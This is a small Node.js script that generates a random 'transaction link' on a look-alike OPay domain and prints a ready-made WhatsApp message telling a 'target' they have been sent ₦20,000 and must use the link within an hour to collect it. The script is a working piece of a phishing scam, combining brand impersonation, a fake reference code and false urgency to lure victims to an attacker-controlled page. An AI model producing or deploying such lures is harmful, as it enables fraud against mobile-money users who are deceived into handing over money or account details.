// Run: node gen-link.js
// Generates a random transaction link to send to target

const DOMAIN = process.env.DOMAIN || 'https://opayit.com';
const chars  = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
const len    = 12;

let id = '';
for (let i = 0; i < len; i++) {
  id += chars[Math.floor(Math.random() * chars.length)];
}

const link = `${DOMAIN}/${id}`;

console.log('\n  Transaction link:');
console.log(`  ${link}`);
console.log('\n  WhatsApp message:');
console.log(`  "Hi, I sent you ₦20,000 via OPay cash transfer.\n  Use this link to locate an agent near you to collect: ${link}\n  Reference: ${id.toUpperCase()}\n  Expires in 1 hour."\n`);
